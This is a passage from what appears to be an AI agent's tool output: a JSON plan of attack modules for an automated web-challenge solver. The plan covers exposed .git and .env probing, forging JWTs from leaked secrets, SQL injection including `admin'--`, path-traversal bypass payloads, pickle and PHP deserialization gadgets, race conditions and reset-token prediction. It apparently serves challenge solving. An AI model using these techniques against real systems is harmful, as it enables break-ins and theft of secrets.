pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D01 cousin. Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /server-status, /debug, /actuator/env, /phpinfo.php ONLY when recon names them or as part of the capped recon list. Pure parser: .git objects (zlib) -> commits -> trees -> blobs (rebuild a file from loose objects; packfile index for refs), .DS_Store filename list, Django DEBUG 404 URL-pattern list -> new routes, .env KEY=VALUE secrets -> jwt-session-forge.\"},\n  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Sequel to D03. ORDER BY / NULL-count column discovery, UNION SELECT with the proof-table guess taken from error messages or sqlite_master / information_schema, string-column detection by marker; boolean-blind extraction with a diff oracle over the response length (bounded: one char at a time over [0-9a-f_proof], 32-char cap). Login-form bypass `admin'--`. SQLite/MySQL/Postgres comment and concat dialects.\"},\n  {\"id\": \"graphql-introspection\", \"concept\": \"GraphQL schema leak / hidden field (row 23)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"If /graphql or a `{\\\"data\\\":` response appears: standard introspection query, list every type/field, then query hidden fields (proof, secret, flag, note, evidence) and node(id) lookups for foreign objects (IDOR over GraphQL). Field suggestions ('Did you mean') when introspection is off.\"},\n  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Extend D04's payload set into a planner: nested strip (....//, ..././), URL / double URL / overlong UTF-8 encoding of dot and slash, backslash, required prefix (keep the original dir: pages/../../..), appended suffix (.php/.html -> %00, ?, #, path truncation, php://filter), absolute path, file:// scheme, /proc/self/cwd and /proc/self/root prefixes. Order cheapest-first; parser decodes base64 filter output.\"},\n  {\"id\": \"deserialization-gadgets\", \"concept\": \"pickle / PHP / node-serialize cookies (row 21)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Recognise base64 cookies starting gASV/gAN (pickle), Tzo/YTo (PHP O:/a:), {\\\"rce\\\" / _$$ND_FUNC$$_ (node-serialize), rO0 (Java). Build minimal gadgets that read the proof path (pickle os.popen reduce; PHP property tampering of an isAdmin/role field before any RCE). Prefer data tampering over code execution.\"},\n  {\"id\": \"logic-race-reset\", \"concept\": \"business logic, race, predictable reset tokens (rows 26, 27)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Planner for numeric fields (negative, zero, huge, float, overflow), coupon/redeem replay, parallel burst plan (~20 requests) for a single-use action, and reset-token prediction from tokens the app itself leaks (timestamp, md5(email), sequential). No credential guessing.\"},\n  {\"id\": \"record-target-responses\", \"concept\": \"replayable live-target cases\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Targets 410 after CORRECT and the saved contract may be the `preparing` body, so solver-test cannot replay singles (D02/D03 HELP). Harness: log every target request/response the solver or worker makes during the single into solver/cases/<case>/http/ and let solve.py replay them when the host 410s; this is also the fixture source for the web prebuild.\"},\n  {\"id\": \"headless-browser\", \"concept\": \"DOM / XSS needing a JS engine (row 13)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"Only if an XSS day needs client-side execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or use the system chromium --headless --dump-dom). Most days are provable server-side; don't install before a day needs it.\"}\n]\n```\n","userModified":false},"tool_result_meta":[{"id":"toolu_01BgJtn4h4k7zwzECyQZG2kk","permission_decision":{"decision":"accept","source":"config","reason_type":"mode"}}]}
